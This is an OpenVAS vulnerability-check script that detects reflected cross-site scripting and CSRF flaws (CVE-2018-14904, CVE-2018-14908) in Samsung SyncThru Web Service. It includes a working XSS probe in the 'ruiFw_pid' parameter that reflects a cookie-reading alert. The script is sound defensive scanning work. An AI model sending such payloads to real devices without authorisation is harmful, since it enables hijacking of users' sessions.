###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_samsung_syncthru_web_service_xss_n_csrf_vuln.nasl 13858 2019-02-26 04:17:07Z ckuersteiner $
#
# Samsung Syncthru Web Service XSS And CSRF Vulnerabilities
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2018 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:samsung:syncthru_web_service";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.813745");
  script_version("$Revision: 13858 $");
  script_cve_id("CVE-2018-14904", "CVE-2018-14908");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-02-26 05:17:07 +0100 (Tue, 26 Feb 2019) $");
  script_tag(name:"creation_date", value:"2018-08-06 18:50:27 +0530 (Mon, 06 Aug 2018)");

  script_name("Samsung Syncthru Web Service XSS And CSRF Vulnerabilities");

  script_tag(name:"summary", value:"The host is running Samsung Syncthru Web
  Service and is prone to cross-site scripting and cross-site request forgery
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check
  whether it is possible to read a cookie or not.");

  script_tag(name:"insight", value:"Multiple flaws exist due to,

  - Improper sanitization of user input data like via 'ruiFw_pid' parameter.

  - Lack of protection against CSRF attacks.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to conduct CSRF attacks and inject arbitrary web script or HTML in
  a user's browser session within the trust relationship between their browser
  and the server.");

  script_tag(name:"affected", value:"Samsung Syncthru Web Service");

  script_tag(name:"solution", value:"No known solution is available as of 26th February, 2019.
  Information regarding this issue will be updated once solution details are available.");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_xref(name:"URL", value:"https://medium.com/stolabs/security-issues-on-samsung-syncthru-web-service-cc86467d2df");
  script_xref(name:"URL", value:"https://samsung-printerdrivers.com/tag/samsung-syncthru-download/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_samsung_syncthru_web_service_detect.nasl");
  script_mandatory_keys("Samsung/SyncThru/Web/Service/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port( cpe: CPE )) exit(0);

if(!dir = get_app_location(cpe:CPE, port:http_port)) exit(0);
if( dir == "/" ) dir = "";

url = dir + "/sws/leftmenu.jsp?ruiFw_id=activeAlert&ruiFw_pid=</script>" +
            "svg/onload=alert(document.cookie)>&ruiFw_title=Information";
if(http_vuln_check(port:http_port, url: url, pattern:"</script>svg/onload=alert\(document.cookie\)>",
                   extra_check: make_list("swsLeftMenuFrame", "'Information'", "'activeAlert'"),
                   check_header:TRUE))
{
  report = report_vuln_url(port:http_port, url:url);
  security_message(port:http_port, data:report);
  exit(0);
}
exit(99);
